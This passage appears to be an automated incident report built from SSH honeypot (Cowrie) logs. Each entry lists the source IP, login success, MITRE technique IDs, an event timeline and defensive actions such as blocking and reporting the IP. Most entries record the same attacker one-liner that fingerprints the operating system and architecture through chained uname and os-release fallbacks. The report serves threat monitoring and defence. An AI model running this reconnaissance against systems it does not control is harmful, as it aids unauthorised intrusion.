| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:40:39` | `cowrie.session.connect` |
| `2026-07-06 05:40:39` | `cowrie.client.version` |
| `2026-07-06 05:40:39` | `cowrie.client.kex` |
| `2026-07-06 05:40:43` | `cowrie.login.success` |
| `2026-07-06 05:40:45` | `cowrie.session.params` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:45` | `cowrie.command.success` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:45` | `cowrie.command.input` |
| `2026-07-06 05:40:46` | `cowrie.log.closed` |
| `2026-07-06 05:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f41d4a82b8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:41 |
| **Last Seen** | 2026-07-06 05:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:41:25` | `cowrie.session.connect` |
| `2026-07-06 05:41:25` | `cowrie.client.version` |
| `2026-07-06 05:41:25` | `cowrie.client.kex` |
| `2026-07-06 05:41:29` | `cowrie.login.success` |
| `2026-07-06 05:41:31` | `cowrie.session.params` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.command.success` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.command.input` |
| `2026-07-06 05:41:31` | `cowrie.log.closed` |
| `2026-07-06 05:41:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6f41c3bc4e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:42 |
| **Last Seen** | 2026-07-06 05:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:42:10` | `cowrie.session.connect` |
| `2026-07-06 05:42:11` | `cowrie.client.version` |
| `2026-07-06 05:42:11` | `cowrie.client.kex` |
| `2026-07-06 05:42:14` | `cowrie.login.success` |
| `2026-07-06 05:42:16` | `cowrie.session.params` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:16` | `cowrie.command.success` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:16` | `cowrie.command.input` |
| `2026-07-06 05:42:17` | `cowrie.log.closed` |
| `2026-07-06 05:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367d05dc207b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:42 |
| **Last Seen** | 2026-07-06 05:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:42:56` | `cowrie.session.connect` |
| `2026-07-06 05:42:57` | `cowrie.client.version` |
| `2026-07-06 05:42:57` | `cowrie.client.kex` |
| `2026-07-06 05:43:00` | `cowrie.login.success` |
| `2026-07-06 05:43:02` | `cowrie.session.params` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:02` | `cowrie.command.success` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:02` | `cowrie.command.input` |
| `2026-07-06 05:43:03` | `cowrie.log.closed` |
| `2026-07-06 05:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6366e1fba1b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:43 |
| **Last Seen** | 2026-07-06 05:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:43:41` | `cowrie.session.connect` |
| `2026-07-06 05:43:42` | `cowrie.client.version` |
| `2026-07-06 05:43:42` | `cowrie.client.kex` |
| `2026-07-06 05:43:45` | `cowrie.login.success` |
| `2026-07-06 05:43:47` | `cowrie.session.params` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.command.success` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.command.input` |
| `2026-07-06 05:43:47` | `cowrie.log.closed` |
| `2026-07-06 05:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c0e517743d2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 05:43 |
| **Last Seen** | 2026-07-06 05:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:43:43` | `cowrie.session.connect` |
| `2026-07-06 05:43:44` | `cowrie.client.version` |
| `2026-07-06 05:43:44` | `cowrie.client.kex` |
| `2026-07-06 05:43:50` | `cowrie.login.success` |
| `2026-07-06 05:43:54` | `cowrie.session.params` |
| `2026-07-06 05:43:54` | `cowrie.command.input` |
| `2026-07-06 05:43:55` | `cowrie.log.closed` |
| `2026-07-06 05:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba0440273b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:44 |
| **Last Seen** | 2026-07-06 05:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:44:27` | `cowrie.session.connect` |
| `2026-07-06 05:44:27` | `cowrie.client.version` |
| `2026-07-06 05:44:27` | `cowrie.client.kex` |
| `2026-07-06 05:44:30` | `cowrie.login.success` |
| `2026-07-06 05:44:32` | `cowrie.session.params` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:32` | `cowrie.command.success` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:32` | `cowrie.command.input` |
| `2026-07-06 05:44:33` | `cowrie.log.closed` |
| `2026-07-06 05:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c6b53a33ad1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:45 |
| **Last Seen** | 2026-07-06 05:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:45:11` | `cowrie.session.connect` |
| `2026-07-06 05:45:12` | `cowrie.client.version` |
| `2026-07-06 05:45:12` | `cowrie.client.kex` |
| `2026-07-06 05:45:15` | `cowrie.login.success` |
| `2026-07-06 05:45:17` | `cowrie.session.params` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:17` | `cowrie.command.success` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:17` | `cowrie.command.input` |
| `2026-07-06 05:45:18` | `cowrie.log.closed` |
| `2026-07-06 05:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8a7497d3e4e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:45 |
| **Last Seen** | 2026-07-06 05:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:45:55` | `cowrie.session.connect` |
| `2026-07-06 05:45:56` | `cowrie.client.version` |
| `2026-07-06 05:45:56` | `cowrie.client.kex` |
| `2026-07-06 05:45:59` | `cowrie.login.success` |
| `2026-07-06 05:46:01` | `cowrie.session.params` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:01` | `cowrie.command.success` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:01` | `cowrie.command.input` |
| `2026-07-06 05:46:02` | `cowrie.log.closed` |
| `2026-07-06 05:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2406f90b3d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:46 |
| **Last Seen** | 2026-07-06 05:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:46:39` | `cowrie.session.connect` |
| `2026-07-06 05:46:40` | `cowrie.client.version` |
| `2026-07-06 05:46:40` | `cowrie.client.kex` |
| `2026-07-06 05:46:43` | `cowrie.login.success` |
| `2026-07-06 05:46:45` | `cowrie.session.params` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:45` | `cowrie.command.success` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:45` | `cowrie.command.input` |
| `2026-07-06 05:46:46` | `cowrie.log.closed` |
| `2026-07-06 05:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813378dbe657

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:47 |
| **Last Seen** | 2026-07-06 05:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:47:22` | `cowrie.session.connect` |
| `2026-07-06 05:47:23` | `cowrie.client.version` |
| `2026-07-06 05:47:23` | `cowrie.client.kex` |
| `2026-07-06 05:47:26` | `cowrie.login.success` |
| `2026-07-06 05:47:28` | `cowrie.session.params` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:28` | `cowrie.command.success` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:28` | `cowrie.command.input` |
| `2026-07-06 05:47:29` | `cowrie.log.closed` |
| `2026-07-06 05:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b3ace403c3a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:48 |
| **Last Seen** | 2026-07-06 05:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:48:07` | `cowrie.session.connect` |
| `2026-07-06 05:48:07` | `cowrie.client.version` |
| `2026-07-06 05:48:07` | `cowrie.client.kex` |
| `2026-07-06 05:48:11` | `cowrie.login.success` |
| `2026-07-06 05:48:13` | `cowrie.session.params` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:13` | `cowrie.command.success` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:13` | `cowrie.command.input` |
| `2026-07-06 05:48:14` | `cowrie.log.closed` |
| `2026-07-06 05:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c3e6a800b98

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:48 |
| **Last Seen** | 2026-07-06 05:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:48:51` | `cowrie.session.connect` |
| `2026-07-06 05:48:52` | `cowrie.client.version` |
| `2026-07-06 05:48:52` | `cowrie.client.kex` |
| `2026-07-06 05:48:55` | `cowrie.login.success` |
| `2026-07-06 05:48:57` | `cowrie.session.params` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
| `2026-07-06 05:48:57` | `cowrie.command.input` |
